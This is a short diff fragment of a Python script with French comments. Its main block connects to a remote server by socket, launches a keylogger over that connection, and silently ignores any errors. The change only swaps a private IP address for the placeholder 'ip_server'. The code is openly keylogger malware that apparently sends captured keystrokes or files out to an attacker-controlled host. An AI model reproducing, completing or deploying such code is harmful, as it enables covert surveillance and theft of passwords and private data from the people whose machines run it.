@@ -73,7 +73,7 @@ def send_file_securely(client_socket):
 
 if __name__ == "__main__":
     try:
-        mysocket = get_socket("192.168.1.13", 12345) # connexion au serveur
+        mysocket = get_socket("ip_server", 12345) # connexion au serveur
         launch_keylogger(mysocket) # lancement du keylogger
     except Exception:
         pass
